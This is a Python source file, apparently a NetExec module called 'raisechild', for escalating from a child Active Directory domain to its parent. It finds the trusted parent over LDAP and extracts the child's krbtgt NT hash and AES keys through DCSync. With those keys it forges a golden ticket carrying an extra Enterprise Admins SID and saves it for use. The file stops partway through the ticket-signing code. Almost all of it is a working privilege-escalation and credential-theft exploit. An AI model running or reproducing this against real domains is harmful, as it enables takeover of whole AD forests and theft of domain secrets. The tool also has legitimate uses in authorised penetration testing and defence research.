import os
import re
import datetime
from contextlib import suppress
from calendar import timegm
from binascii import unhexlify

from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.dcerpc.v5.drsuapi import DCERPCSessionError
from impacket.krb5.asn1 import (
    AS_REP,
    EncTicketPart,
    EncASRepPart,
    AuthorizationData,
)
from impacket.krb5.types import KerberosTime
from impacket.krb5.constants import (
    ApplicationTagNumbers,
    ProtocolVersionNumber,
    PrincipalNameType,
    TicketFlags,
    AuthorizationDataType,
    EncryptionTypes,
    ChecksumTypes,
    KERB_NON_KERB_CKSUM_SALT,
    encodeFlags,
)
from impacket.krb5.crypto import Key, _enctype_table, _checksum_table
from impacket.krb5.ccache import CCache
from impacket.krb5.pac import (
    VALIDATION_INFO,
    KERB_VALIDATION_INFO,
    PAC_LOGON_INFO,
    PAC_CLIENT_INFO,
    PAC_CLIENT_INFO_TYPE,
    PAC_REQUESTOR,
    PAC_REQUESTOR_INFO,
    PAC_SERVER_CHECKSUM,
    PAC_PRIVSVR_CHECKSUM,
    PAC_SIGNATURE_DATA,
    PAC_INFO_BUFFER,
    PACTYPE,
    PKERB_SID_AND_ATTRIBUTES_ARRAY,
    KERB_SID_AND_ATTRIBUTES,
)
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import (
    GROUP_MEMBERSHIP,
    SE_GROUP_MANDATORY,
    SE_GROUP_ENABLED_BY_DEFAULT,
    SE_GROUP_ENABLED,
    USER_NORMAL_ACCOUNT,
    USER_DONT_EXPIRE_PASSWORD,
)
from impacket.dcerpc.v5.dtypes import SID, RPC_SID, NULL

from pyasn1.codec.der import encoder
from pyasn1.type.univ import noValue

from nxc.parsers.ldap_results import parse_result_attributes
from nxc.helpers.misc import CATEGORY

# Encryption type configurations: enctype, checksum, signature size, session key size
ETYPE_CONFIG = {
    "rc4": (
        EncryptionTypes.rc4_hmac.value,
        ChecksumTypes.hmac_md5.value,
        16,
        16,
    ),
    "aes128": (
        EncryptionTypes.aes128_cts_hmac_sha1_96.value,
        ChecksumTypes.hmac_sha1_96_aes128.value,
        12,
        16,
    ),
    "aes256": (
        EncryptionTypes.aes256_cts_hmac_sha1_96.value,
        ChecksumTypes.hmac_sha1_96_aes256.value,
        12,
        32,
    ),
}


class NXCModule:
    """Module made by @azoxlpf, refactored for robustness"""

    name = "raisechild"
    description = "Compromise parent domain from child domain via trust abuse (golden ticket with extra SID)."
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

        self.parent_domain = None
        self.parent_sid = None
        self.child_sid = None

        self.target_dc = None
        self.forged_tgt = None

        # krbtgt materials
        self.krbtgt_hash = ""
        self.aes128_key = ""
        self.aes256_key = ""

        # encryption selection
        self.requested_etype = "auto"  # operator request
        self.etype = "rc4"             # final chosen etype

        # ticket lifetime (minutes)
        self.tgt_minutes = 60  # ~10 years, original behavior

    def options(self, context, module_options):
        """
        Forge a Kerberos TGT using the child domain's krbtgt key, with an extra SID
        targeting privileged groups in the parent domain. Requires an existing AD trust
        with the parent and inbound direction.

        USER          Target username to forge the ticket for (default: Administrator)
        USER_ID       RID used as the user ID in the PAC (default: 500)
        RID           RID used for the extra SID in the parent domain (default: 519 = Enterprise Admins)
        ETYPE         Encryption type: rc4, aes128, aes256, or auto (default: auto; prefers AES256→AES128→RC4)
        TGT_MINUTES   Ticket lifetime in minutes (default: 1 hour)

        Examples:
          netexec ldap <ip> -u <username> -p <password> -M raisechild -o USER=DC01$
          netexec ldap <ip> -u <username> -p <password> -M raisechild -o USER_ID=1001
          netexec ldap <ip> -u <username> -p <password> -M raisechild -o RID=512
          netexec ldap <ip> -u <username> -p <password> -M raisechild -o ETYPE=aes256
          netexec ldap <ip> -u <username> -p <password> -M raisechild -o TGT_minutes=24
        """
        self.context = context
        self.module_options = module_options or {}

        self.requested_etype = (
            self.module_options.get("ETYPE", "auto").strip().lower()
        )
        if self.requested_etype not in ("auto", "rc4", "aes128", "aes256"):
            context.log.fail(
                f"Invalid ETYPE='{self.requested_etype}', falling back to 'auto'"
            )
            self.requested_etype = "auto"

        tgt_minutes_raw = self.module_options.get("TGT_MINUTES", None)

        if tgt_minutes_raw is not None:
            try:
                self.tgt_minutes = int(str(tgt_minutes_raw).strip())
                if self.tgt_minutes <= 0:
                    raise ValueError
            except Exception:
                context.log.fail(
                    f"Invalid TGT_MINUTES='{tgt_minutes_raw}', using default 60"
                )
                self.tgt_minutes = 60
        else:
            # default: 1 hour in minutes
            self.tgt_minutes = 60
        
    def on_login(self, context, connection):
        """
        LDAP modules only get on_admin_login() if NetExec thinks the user is an admin.
        We want raisechild to ALWAYS run, so we call on_admin_login() directly.
        """
        return self.on_admin_login(context, connection)
    

    def on_admin_login(self, context, connection):
        self.context = context

        start = datetime.datetime.now()
        context.log.display("Running raisechild module...")
        context.log.display(
            f"[raisechild] Started at {start.isoformat(sep=' ', timespec='seconds')}"
        )

        self._get_child_sid(connection)
        self._get_parent_info(connection)

        if not self.parent_domain or not self.parent_sid:
            context.log.fail(
                "No suitable parent trust (AD + inbound/bi-directional) found."
            )
            return

        context.log.display(
            f"[raisechild] Parent domain: {self.parent_domain} | Parent SID: {self.parent_sid}"
        )

        # Pull krbtgt secrets via DCSync
        if not self._collect_krbtgt_material(connection):
            return

        # Select best key based on operator request + available material
        if not self._select_effective_etype():
            return

        context.log.display(
            f"[raisechild] Using etype={self.etype.upper()} | TGT lifetime={self.tgt_minutes} minutes"
        )

        # Forge and save TGT (cryptographic guts left untouched)
        try:
            tgt_path = self.forge_golden_ticket(connection)
            self.forged_tgt = tgt_path
            context.log.success(
                f"Golden ticket forged successfully (etype: {self.etype}). Saved to: {tgt_path}"
            )
            context.log.success(
                f"Use this TGT via: export KRB5CCNAME={tgt_path}"
            )
        except Exception as e:
            context.log.fail(f"Error while generating golden ticket: {e}")
            return

        end = datetime.datetime.now()
        duration = (end - start).total_seconds()
        context.log.display(
            f"[raisechild] Completed at {end.isoformat(sep=' ', timespec='seconds')} "
            f"(elapsed: {duration:.1f}s)"
        )

    # -------------------------------------------------------------------------
    # Domain / trust helpers
    # -------------------------------------------------------------------------

    def _get_child_sid(self, connection):
        if getattr(connection, "sid_domain", None):
            self.child_sid = connection.sid_domain
            self.context.log.highlight(f"Child Domain SID: {self.child_sid}")
        else:
            self.context.log.fail(
                "Could not retrieve child domain SID from connection."
            )

    def _get_parent_info(self, connection):
        """
        Look for trustedDomain objects under CN=System that represent an uplevel
        parent with inbound (1) or bi-directional (3) trustDirection.
        """
        base_dn = f"CN=System,{connection.baseDN}"
        attributes = [
            "name",
            "trustPartner",
            "securityIdentifier",
            "trustDirection",
            "trustType",
        ]

        try:
            response = connection.search(
                searchFilter="(objectClass=trustedDomain)",
                attributes=attributes,
                baseDN=base_dn,
            )
            trusts = parse_result_attributes(response)
            self.context.log.debug(f"TrustedDomain objects: {trusts}")
        except Exception as e:
            self.context.log.fail(f"Failed to query trustedDomain entries: {e}")
            return

        for trust in trusts:
            try:
                trust_name = trust.get("name")
                trust_partner = trust.get("trustPartner")
                trust_sid_bytes = trust.get("securityIdentifier")
                trust_direction = int(trust.get("trustDirection", 0))
                trust_type = int(trust.get("trustType", 0))
            except Exception:
                continue

            # 2 = TRUST_TYPE_UPLEVEL; direction 1 (inbound) or 3 (bi-directional)
            if trust_type != 2 or trust_direction not in (1, 3):
                continue

            parent_domain_name = trust_partner or trust_name
            if not parent_domain_name:
                continue

            parent_sid_str = None
            try:
                sid_bytes = trust_sid_bytes
                revision = sid_bytes[0]
                count = sid_bytes[1]
                id_auth = int.from_bytes(sid_bytes[2:8], byteorder="big")
                sub_auths = [
                    str(
                        int.from_bytes(
                            sid_bytes[8 + i * 4 : 12 + i * 4], byteorder="little"
                        )
                    )
                    for i in range(count)
                ]
                parent_sid_str = f"S-{revision}-{id_auth}-" + "-".join(sub_auths)
            except Exception as e:
                self.context.log.fail(
                    f"Failed to convert parent SID to string for trust {parent_domain_name}: {e}"
                )

            if parent_sid_str:
                self.parent_domain = parent_domain_name
                self.parent_sid = parent_sid_str
                self.context.log.highlight(
                    f"Parent domain name: {self.parent_domain}"
                )
                self.context.log.highlight(
                    f"Parent domain SID:  {self.parent_sid}"
                )
                return

    # -------------------------------------------------------------------------
    # DCSync and krbtgt key collection
    # -------------------------------------------------------------------------

    def _get_smb_session(self, ldap_conn):
        smb = SMBConnection(
            remoteName=ldap_conn.hostname,
            remoteHost=ldap_conn.host,
            sess_port=445,
        )

        if ldap_conn.kerberos:
            smb.kerberosLogin(
                user=ldap_conn.username,
                password=ldap_conn.password,
                domain=ldap_conn.domain,
                lmhash=ldap_conn.lmhash,
                nthash=ldap_conn.nthash,
                aesKey=ldap_conn.aesKey,
                kdcHost=ldap_conn.kdcHost,
                useCache=ldap_conn.use_kcache,
            )
        elif ldap_conn.nthash or ldap_conn.lmhash:
            # NTLM pass-the-hash
            smb.login(
                ldap_conn.username,
                "",
                ldap_conn.domain,
                lmhash=ldap_conn.lmhash,
                nthash=ldap_conn.nthash,
            )
        else:
            # NTLM with cleartext password
            smb.login(ldap_conn.username, ldap_conn.password, ldap_conn.domain)
        return smb

    def _get_domain_netbios(self, ldap_conn):
        resp = ldap_conn.search(
            baseDN=f"CN=Partitions,{ldap_conn.configuration_context}",
            searchFilter=f"(&(objectCategory=crossRef)(dnsRoot={ldap_conn.targetDomain})(nETBIOSName=*))",
            attributes=["nETBIOSName"],
        )
        entries = parse_result_attributes(resp)
        return entries[0]["nETBIOSName"]

    def _dcsync_krbtgt(self, smb_conn, ldap_conn):
        """
        Perform a focused DCSync of krbtgt; collect RC4/AES keys if present.
        """
        ntds = None
        rop = None

        try:
            rop = RemoteOperations(
                smb_conn,
                doKerberos=ldap_conn.kerberos,
                kdcHost=ldap_conn.kdcHost,
            )
            rop.enableRegistry()
            boot_key = rop.getBootKey()

            domain_netbios = self._get_domain_netbios(ldap_conn)
            target_user = f"{domain_netbios}/krbtgt"

            def grab_hash(secret_type, secret):
                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
                    # NT hash
                    self.krbtgt_hash = secret
                elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                    low = secret.lower()
                    if "aes256-cts-hmac-sha1-96" in low:
                        self.aes256_key = secret.split(":")[-1]
                    elif "aes128-cts-hmac-sha1-96" in low:
                        self.aes128_key = secret.split(":")[-1]

            ntds = NTDSHashes(
                None,
                boot_key,
                isRemote=True,
                noLMHash=True,
                remoteOps=rop,
                justNTLM=False,
                justUser=target_user,
                printUserStatus=False,
                perSecretCallback=grab_hash,
            )
            ntds.dump()

            # Summary output
            if self.aes256_key:
                self.context.log.highlight(f"krbtgt AES256 key: {self.aes256_key}")
            if self.aes128_key:
                self.context.log.highlight(f"krbtgt AES128 key: {self.aes128_key}")
            if self.krbtgt_hash:
                self.context.log.highlight(f"krbtgt RC4 hash: {self.krbtgt_hash}")

            if not any((self.aes256_key, self.aes128_key, self.krbtgt_hash)):
                self.context.log.fail(
                    "DCSync completed, but no krbtgt keys/hashes were recovered."
                )

        except DCERPCSessionError as e:
            self.context.log.fail(f"RPC DRSUAPI error during DCSync: {e}")
        except Exception as e:
            self.context.log.fail(f"DCSync error: {e}")
        finally:
            with suppress(Exception):
                if ntds:
                    ntds.finish()
            with suppress(Exception):
                if rop:
                    rop.finish()
            with suppress(Exception):
                smb_conn.logoff()

    def _collect_krbtgt_material(self, connection):
        """
        Wrapper to obtain krbtgt material; returns True on success.
        """
        try:
            smb_conn = self._get_smb_session(connection)
        except Exception as e:
            self.context.log.fail(f"Error creating SMB session for DCSync: {e}")
            return False

        self._dcsync_krbtgt(smb_conn, connection)

        if not any((self.aes256_key, self.aes128_key, self.krbtgt_hash)):
            self.context.log.fail(
                "Cannot forge ticket: no krbtgt AES or RC4 material found."
            )
            return False

        return True

    # -------------------------------------------------------------------------
    # Encryption / key selection
    # -------------------------------------------------------------------------

    def _select_effective_etype(self):
        """
        Decide which etype to actually use given:
        - operator preference (self.requested_etype)
        - available krbtgt materials
        """
        # Helper to test availability
        have = {
            "aes256": bool(self.aes256_key),
            "aes128": bool(self.aes128_key),
            "rc4": bool(self.krbtgt_hash),
        }

        # Operator explicitly chose one
        if self.requested_etype in ("rc4", "aes128", "aes256"):
            if have[self.requested_etype]:
                self.etype = self.requested_etype
                self.context.log.display(
                    f"[raisechild] Using requested ETYPE={self.etype.upper()}"
                )
                return True
            else:
                self.context.log.fail(
                    f"Requested ETYPE='{self.requested_etype}' not available from DCSync."
                )
                return False

        # Auto mode: prefer AES256 → AES128 → RC4
        for candidate in ("aes256", "aes128", "rc4"):
            if have[candidate]:
                self.etype = candidate
                self.context.log.display(
                    f"[raisechild] Auto-selected ETYPE={self.etype.upper()}"
                )
                return True

        self.context.log.fail("No usable krbtgt keys found for any ETYPE.")
        return False

    # -------------------------------------------------------------------------
    # Golden ticket forging (cryptographic guts unchanged)
    # -------------------------------------------------------------------------

    def forge_golden_ticket(self, connection):
        """
        Forge a golden ticket for the parent domain using the krbtgt key.
        Supports optional USER, RID, USER_ID and ETYPE/TGT_minutes module options.
        """
        admin_name = self.module_options.get("USER", "Administrator")
        extra_rid = str(self.module_options.get("RID", "519"))
        extra_sid = f"{self.parent_sid}-{extra_rid}"
        user_rid = str(self.module_options.get("USER_ID", "500"))

        domain_upper = connection.domain.upper()
        groups_list = [513, 512, 520, 518, 519]

        # Create ticket
        enctype_value, checksum_type, sig_size, key_size = ETYPE_CONFIG[self.etype]
        key_map = {
            "rc4": self.krbtgt_hash,
            "aes128": self.aes128_key,
            "aes256": self.aes256_key,
        }
        raw_key = key_map[self.etype]
        if self.etype == "rc4":
            raw_key = self._clean_nthash(raw_key)
        krbtgt_key = Key(
            _enctype_table[enctype_value].enctype, unhexlify(raw_key)
        )

        validation_info = self._createBasicValidationInfo(
            admin_name, domain_upper, self.child_sid, groups_list, int(user_rid)
        )
        pac_infos = self._createBasicPac(
            validation_info, admin_name, checksum_type, sig_size
        )
        self._createRequestorInfoPac(pac_infos, self.child_sid, int(user_rid))

        as_rep = self._buildAsrep(domain_upper, admin_name, enctype_value)
        # Use configurable lifetime instead of fixed 87600h
        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(
            as_rep,
            domain_upper,
            admin_name,
            self.tgt_minutes,
            enctype_value,
            pac_infos,
            key_size,
        )

        self._injectExtraSids(pac_infos, extra_sid)

        encoded_asrep, client_session_key = self._signEncryptTicket(
            as_rep,
            enc_asrep_part,
            enc_ticket_part,
            pac_infos,
            krbtgt_key,
            enctype_value,
        )

        return self._saveTicket(admin_name, encoded_asrep, client_session_key)

    def _clean_nthash(self, raw):
        if ":" in raw:
            parts = raw.split(":")
            if len(parts) >= 4:
                raw = parts[3]
        raw = raw.strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", raw):
            raise ValueError(f"Invalid NT-hash format : {raw}")
        return raw.lower()

    # ------------------------ forging helpers (unchanged logic) ------------------------

    @staticmethod
    def _getFileTime(unix_seconds: int) -> int:
        return unix_seconds * 10_000_000 + 116_444_736_000_000_000

    @staticmethod
    def _getPadLength(length: int) -> int:
        return ((length + 7) // 8 * 8) - length

    @staticmethod
    def _getBlockLength(length: int) -> int:
        return (length + 7) // 8 * 8

    def _createBasicValidationInfo(
        self,
        username: str,
        domain: str,
        domain_sid: str,
        groups: list[int],
        user_rid: int,
    ) -> VALIDATION_INFO:
        kerbdata = KERB_VALIDATION_INFO()

        now_utc = datetime.datetime.now(datetime.timezone.utc)
        now_unix = timegm(now_utc.timetuple())
        now_filetime = self._getFileTime(now_unix)

        kerbdata["LogonTime"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
        kerbdata["LogonTime"]["dwHighDateTime"] = now_filetime >> 32
        kerbdata["LogoffTime"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["LogoffTime"]["dwHighDateTime"] = 0x7FFFFFFF
        kerbdata["KickOffTime"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["KickOffTime"]["dwHighDateTime"] = 0x7FFFFFFF

        kerbdata["PasswordLastSet"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
        kerbdata["PasswordLastSet"]["dwHighDateTime"] = now_filetime >> 32
        kerbdata["PasswordCanChange"]["dwLowDateTime"] = 0
        kerbdata["PasswordCanChange"]["dwHighDateTime"] = 0
        kerbdata["PasswordMustChange"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["PasswordMustChange"]["dwHighDateTime"] = 0x7FFFFFFF

        kerbdata["EffectiveName"] = username
        kerbdata["FullName"] = ""
        kerbdata["LogonScript"] = ""
        kerbdata["ProfilePath"] = ""
        kerbdata["HomeDirectory"] = ""
        kerbdata["HomeDirectoryDrive"] = ""
        kerbdata["LogonCount"] = 500
        kerbdata["BadPasswordCount"] = 0
        kerbdata["UserId"] = int(user_rid)

        primary_group_id = int(groups[0]) if groups else 513
        kerbdata["PrimaryGroupId"] = primary_group_id
        kerbdata["GroupCount"] = len(groups)
        for group_rid in (groups or [513]):
            membership = GROUP_MEMBERSHIP()
            ndr_rid = NDRULONG()
            ndr_rid["Data"] = int(group_rid)
            membership["RelativeId"] = ndr_rid
            membership["Attributes"] = (
                SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            )
            kerbdata["GroupIds"].append(membership)

        kerbdata["UserFlags"] = 0
        kerbdata["UserSessionKey"] = b"\x00" * 16
        kerbdata["LogonServer"] = ""
        kerbdata["LogonDomainName"] = domain
        kerbdata["LogonDomainId"].fromCanonical(domain_sid)
        kerbdata["LMKey"] = b"\x00" * 8
        kerbdata["UserAccountControl"] = (
            USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        )
        kerbdata["SubAuthStatus"] = 0

        kerbdata["LastSuccessfulILogon"]["dwLowDateTime"] = 0
        kerbdata["LastSuccessfulILogon"]["dwHighDateTime"] = 0
        kerbdata["LastFailedILogon"]["dwLowDateTime"] = 0
        kerbdata["LastFailedILogon"]["dwHighDateTime"] = 0
        kerbdata["FailedILogonCount"] = 0
        kerbdata["Reserved3"] = 0

        kerbdata["ResourceGroupDomainSid"] = NULL
        kerbdata["ResourceGroupCount"] = 0
        kerbdata["ResourceGroupIds"] = NULL

        validation_info = VALIDATION_INFO()
        validation_info["Data"] = kerbdata
        return validation_info

    def _createBasicPac(
        self,
        validation_info: VALIDATION_INFO,
        username: str,
        checksum_type: int,
        sig_size: int,
    ) -> dict:
        pac_infos: dict[int, bytes] = {}
        pac_infos[PAC_LOGON_INFO] = (
            validation_info.getData() + validation_info.getDataReferents()
        )

        server_checksum_placeholder = PAC_SIGNATURE_DATA()
        private_checksum_placeholder = PAC_SIGNATURE_DATA()
        server_checksum_placeholder["SignatureType"] = checksum_type
        private_checksum_placeholder["SignatureType"] = checksum_type
        server_checksum_placeholder["Signature"] = b"\x00" * sig_size
        private_checksum_placeholder["Signature"] = b"\x00" * sig_size
        pac_infos[PAC_SERVER_CHECKSUM] = server_checksum_placeholder.getData()
        pac_infos[PAC_PRIVSVR_CHECKSUM] = private_checksum_placeholder.getData()

        client_info = PAC_CLIENT_INFO()
        client_name_utf16 = username.encode("utf-16le")
        client_info["Name"] = client_name_utf16
        client_info["NameLength"] = len(client_name_utf16)
        pac_infos[PAC_CLIENT_INFO_TYPE] = client_info.getData()

        return pac_infos

    def _createRequestorInfoPac(
        self, pac_infos: dict, domain_sid: str, user_rid: int
    ) -> None:
        requestor = PAC_REQUESTOR()
        requestor["UserSid"] = SID()
        requestor["UserSid"].fromCanonical(f"{domain_sid}-{int(user_rid)}")
        pac_infos[PAC_REQUESTOR_INFO] = requestor.getData()

    def _buildAsrep(
        self, domain: str, username: str, enctype_value: int
    ) -> AS_REP:
        as_rep = AS_REP()
        as_rep["msg-type"] = ApplicationTagNumbers.AS_REP.value
        as_rep["pvno"] = 5

        as_rep["crealm"] = domain
        as_rep["cname"] = noValue
        as_rep["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
        as_rep["cname"]["name-string"] = noValue
        as_rep["cname"]["name-string"][0] = username

        as_rep["ticket"] = noValue
        as_rep["ticket"]["tkt-vno"] = ProtocolVersionNumber.pvno.value
        as_rep["ticket"]["realm"] = domain
        as_rep["ticket"]["sname"] = noValue
        as_rep["ticket"]["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
        as_rep["ticket"]["sname"]["name-string"] = noValue
        as_rep["ticket"]["sname"]["name-string"][0] = "krbtgt"
        as_rep["ticket"]["sname"]["name-string"][1] = domain

        as_rep["ticket"]["enc-part"] = noValue
        as_rep["ticket"]["enc-part"]["kvno"] = 2
        as_rep["ticket"]["enc-part"]["etype"] = enctype_value

        as_rep["enc-part"] = noValue
        as_rep["enc-part"]["kvno"] = 2
        as_rep["enc-part"]["etype"] = enctype_value
        as_rep["enc-part"]["cipher"] = noValue
        return as_rep

    def _injectExtraSids(self, pac_infos: dict, extra_sid_csv: str | None) -> None:
        if not extra_sid_csv or PAC_LOGON_INFO not in pac_infos:
            return

        current_blob = pac_infos[PAC_LOGON_INFO]
        validation_info = VALIDATION_INFO()
        validation_info.fromString(current_blob)
        base_len = len(validation_info.getData())
        validation_info.fromStringReferents(current_blob, base_len)

        validation_info["Data"]["UserFlags"] |= 0x20  # LOGON_EXTRA_SIDS

        if (
            validation_info["Data"]["SidCount"] == 0
            or not validation_info["Data"]["ExtraSids"]
        ):
            validation_info["Data"]["ExtraSids"] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
            validation_info["Data"]["SidCount"] = 0

        for sid_txt in str(extra_sid_csv).split(","):
            sid_txt = sid_txt.strip()
            if not sid_txt:
                continue
            sid_and_attr = KERB_SID_AND_ATTRIBUTES()
            rpc_sid = RPC_SID()
            rpc_sid.fromCanonical(sid_txt)
            sid_and_attr["Sid"] = rpc_sid
            sid_and_attr["Attributes"] = (
                SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            )
            validation_info["Data"]["ExtraSids"].append(sid_and_attr)
            validation_info["Data"]["SidCount"] += 1

        pac_infos[PAC_LOGON_INFO] = (
            validation_info.getData() + validation_info.getDataReferents()
        )

    def _buildEncParts(
        self,
        as_rep: AS_REP,
        domain: str,
        username: str,
        duration_minutes: int,
        enctype_value: int,
        pac_infos: dict,
        key_size: int,
    ) -> tuple[EncASRepPart, EncTicketPart, dict]:
        now_utc = datetime.datetime.now(datetime.timezone.utc)
        end_utc = now_utc + datetime.timedelta(minutes=duration_minutes)

        enc_ticket_part = EncTicketPart()
        enc_ticket_part["flags"] = encodeFlags(
            [
                TicketFlags.forwardable.value,
                TicketFlags.proxiable.value,
                TicketFlags.renewable.value,
                TicketFlags.pre_authent.value,
                TicketFlags.initial.value,
            ]
        )

        enc_ticket_part["key"] = noValue
        enc_ticket_part["key"]["keytype"] = enctype_value
        enc_ticket_part["key"]["keyvalue"] = os.urandom(key_size)

        enc_ticket_part["crealm"] = domain
        enc_ticket_part["cname"] = noValue
        enc_ticket_part["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
        enc_ticket_part["cname"]["name-string"] = noValue
        enc_ticket_part["cname"]["name-string"][0] = username

        enc_ticket_part["transited"] = noValue
        enc_ticket_part["transited"]["tr-type"] = 0
        enc_ticket_part["transited"]["contents"] = ""

        enc_ticket_part["authtime"] = KerberosTime.to_asn1(now_utc)
        enc_ticket_part["starttime"] = KerberosTime.to_asn1(now_utc)
        enc_ticket_part["endtime"] = KerberosTime.to_asn1(end_utc)
        enc_ticket_part["renew-till"] = KerberosTime.to_asn1(end_utc)

        enc_ticket_part["authorization-data"] = noValue
        enc_ticket_part["authorization-data"][0] = noValue
        enc_ticket_part["authorization-data"][0][
            "ad-type"
        ] = AuthorizationDataType.AD_IF_RELEVANT.value
        enc_ticket_part["authorization-data"][0]["ad-data"] = noValue

        if PAC_CLIENT_INFO_TYPE in pac_infos:
            client_id_filetime = self._getFileTime(timegm(now_utc.timetuple()))
            pac_client_info = PAC_CLIENT_INFO(pac_infos[PAC_CLIENT_INFO_TYPE])
            pac_client_info["ClientId"] = client_id_filetime
            pac_infos[PAC_CLIENT_INFO_TYPE] = pac_client_info.getData()

        enc_asrep_part = EncASRepPart()
        enc_asrep_part["key"] = noValue
        enc_asrep_part["key"]["keytype"] = enctype_value
        enc_asrep_part["key"]["keyvalue"] = enc_ticket_part["key"]["keyvalue"]
        enc_asrep_part["last-req"] = noValue
        enc_asrep_part["last-req"][0] = noValue
        enc_asrep_part["last-req"][0]["lr-type"] = 0
        enc_asrep_part["last-req"][0]["lr-value"] = KerberosTime.to_asn1(now_utc)
        enc_asrep_part["nonce"] = 123456789
        enc_asrep_part["key-expiration"] = KerberosTime.to_asn1(end_utc)
        enc_asrep_part["flags"] = list(enc_ticket_part["flags"])
        enc_asrep_part["authtime"] = str(enc_ticket_part["authtime"])
        enc_asrep_part["endtime"] = str(enc_ticket_part["endtime"])
        enc_asrep_part["starttime"] = str(enc_ticket_part["starttime"])
        enc_asrep_part["renew-till"] = str(enc_ticket_part["renew-till"])
        enc_asrep_part["srealm"] = domain
        enc_asrep_part["sname"] = noValue
        enc_asrep_part["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
        enc_asrep_part["sname"]["name-string"] = noValue
        enc_asrep_part["sname"]["name-string"][0] = "krbtgt"
        enc_asrep_part["sname"]["name-string"][1] = domain

        return enc_asrep_part, enc_ticket_part, pac_infos

    def _signEncryptTicket(
        self,
        as_rep: AS_REP,
        enc_asrep_part: EncASRepPart,
        enc_ticket_part: EncTicketPart,
        pac_infos: dict,
        krbtgt_key: Key,
        enctype_value: int,
    ) -> tuple[bytes, Key]:
        def zero_pad(n: int) -> bytes:
            return b"\x00" * self._getPadLength(n)

        pac_buffer_order = [
            PAC_LOGON_INFO,
            PAC_CLIENT_INFO_TYPE,
            PAC_REQUESTOR_INFO,
            PAC_SERVER_CHECKSUM,
            PAC_PRIVSVR_CHECKSUM,
        ]

        pac_blobs_with_padding: list[tuple[int, bytes, bytes]] = []
        for buffer_type in pac_buffer_order:
            buffer_bytes = pac_infos[buffer_type]
            pac_blobs_with_padding.append(
                (buffer_type, buffer_bytes, zero_pad(len(buffer_bytes)))
            )

        buffer_count = len(pac_buffer_order)
        pac_info_buffer_header_size = len(PAC_INFO_BUFFER().getData())
        current_data_offset = 8 + pac_info_buffer_header_size * buffer_count

        def make_info_buffer(ul_type: int, blob_length: int) -> PAC_INFO_BUFFER:
            nonlocal current_data_offset
            info_buffer = PAC_INFO_BUFFER()
            info_buffer["ulType"] = ul_type
            info_buffer["cbBufferSize"] = blob_length
            info_buffer["Offset"] = current_data_offset
            current_data_offset = self._getBlockLength(
                current_data_offset + blob_length
            )
            return info_buffer

        info_buffers: list[PAC_INFO_BUFFER] = []
        for buffer_type, buffer_bytes, _ in pac_blobs_with_padding:
            info_buffers.append(make_info_buffer(buffer_type, len(buffer_bytes)))

        buffers_header_bytes = b"".join(
            info_buffer.getData() for info_buffer in info_buffers
        )
        buffers_data_bytes = b"".join(
            buffer_bytes + padding for _, buffer_bytes, padding in pac_blobs_with_padding
        )

        pac_type = PACTYPE()
        pac_type["cBuffers"] = buffer_count
        pac_type["Version"] = 0
        pac_type["Buffers"] = buffers_header_bytes + buffers_data_bytes
        pac_bytes_for_checksum = pac_type.getData()

        server_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_SERVER_CHECKSUM])
        kdc_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_PRIVSVR_CHECKSUM])

        checksum_function_server = _checksum_table[
            server_checksum_struct["SignatureType"]
        ]
        checksum_function_kdc = _checksum_table[kdc_checksum_struct["SignatureType"]]

        server_checksum_struct["Signature"] = checksum_function_server.checksum(
            krbtgt_key, KERB_NON_KERB_CKSUM_SALT, pac_bytes_for_checksum
        )
        kdc_checksum_struct["Signature"] = checksum_function_kdc.checksum(
            krbtgt_key, KERB_NON_KERB_CKSUM_SALT, server_checksum_struct["Signature"]
        )

        rebuilt_blobs: list[bytes] = []
        for buffer_type, buffer_bytes, padding in pac_blobs_with_padding:
            if buffer_type == PAC_SERVER_CHECKSUM:
                buffer_bytes = server_checksum_struct.getData()
            elif buffer_type == PAC_PRIVSVR_CHECKSUM:
                buffer_bytes = kdc_checksum_struct.getData()
            rebuilt_blobs.append(buffer_bytes + padding)
        pac_type["Buffers"] = buffers_header_bytes + b"".join(rebuilt_blobs)

        authorization_data = AuthorizationData()
        authorization_data[0] = noValue
        authorization_data[0][
            "ad-type"
        ] = AuthorizationDataType.AD_WIN2K_PAC.value
        authorization_data[0]["ad-data"] = pac_type.getData()
        enc_ticket_part["authorization-data"][0]["ad-data"] = encoder.encode(
            authorization_data
        )

        ticket_cipher = _enctype_table[enctype_value]
        enc_ticket_part_bytes = encoder.encode(enc_ticket_part)
        encrypted_ticket_ciphertext = ticket_cipher.encrypt(
            krbtgt_key, 2, enc_ticket_part_bytes, None
        )
        as_rep["ticket"]["enc-part"]["cipher"] = encrypted_ticket_ciphertext
        as_rep["ticket"]["enc-part"]["kvno"] = 2

        enc_asrep_part_bytes = encoder.encode(enc_asrep_part)
        client_session_key = Key(
            ticket_cipher.enctype, enc_asrep_part["key"]["keyvalue"].asOctets()
        )
        encrypted_encpart_ciphertext = ticket_cipher.encrypt(
            client_session_key, 3, enc_asrep_part_bytes, None
        )
        as_rep["enc-part"]["cipher"] = encrypted_encpart_ciphertext
        as_rep["enc-part"]["etype"] = ticket_cipher.enctype
        as_rep["enc-part"]["kvno"] = 1

